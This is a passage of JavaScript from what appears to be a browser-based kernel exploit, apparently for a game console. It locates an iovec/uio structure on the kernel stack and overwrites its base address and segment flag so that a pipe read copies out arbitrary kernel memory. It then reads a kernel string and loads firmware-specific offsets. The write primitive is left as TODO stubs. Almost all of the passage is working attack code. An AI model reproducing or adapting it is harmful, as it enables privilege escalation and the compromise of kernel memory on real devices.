            if (possible_iov_base.high == search_iov_base.high && possible_iov_base.low == search_iov_base.low && 
                possible_iov_len.low == search_iov_len) {
                let possible_uio_resid  = p.read8(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RESID));
                let possible_uio_segflg = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_SEGFLG));
                let possible_uio_rw     = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RW));

                if (possible_uio_resid.low == search_iov_len && possible_uio_segflg == 0 && possible_uio_rw == 1) {
                    debug_log("[+] found iov on stack @ 0x" + i.toString(16));
                    stack_iov_offset = i;
                    break;
                }
            }
        }

        if (stack_iov_offset < 0) {
            debug_log("[!] failed to find iov");
            return;
        }

        // Modify iov for kernel address + r/w
        p.write8(kstack.add32(0x3000 + stack_iov_offset + OFFSET_IOV_BASE), kaddr);
        p.write4(kstack.add32(0x3000 + stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG), 1);

        let data = new Uint8Array(0x1000);
        for(let titer = 0x0; titer < 0x1000; titer++) {
            data[titer] = p.read1(kstack.add32(0x3000+titer));
        }

        let received_bytes = await chain.syscall(SYS_READ, pipe_slow_read_fd, pipe_scratch_buf, 0x10000);
        //debug_log("received bytes = 0x" + received_bytes);
        return await chain.syscall(SYS_READ, pipe_slow_read_fd, uaddr, 0x8);
    }

    async function slow_copyin(uaddr, kaddr) {
        // Signal other thread to read using size we want, the thread will hang until we unblock
        await send_cmd_to_kprim_thread(KPRIM_WRITE, uaddr, kaddr);

        // TODO: modify stack data

        // TODO: write data to write
    }

    let slow_krw_qword_store = p.malloc(0x8);
    let kernel_ptr = kbase.add32(0x1EB5133);
    debug_log("try slow copyout on 0x" + kernel_ptr);
    await slow_copyout(kernel_ptr, slow_krw_qword_store);

    debug_log("kernel string: " + readstr(slow_krw_qword_store));
}

async function run_hax() {
    await userland();
}


let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `offsets/${fw_str}.js`);
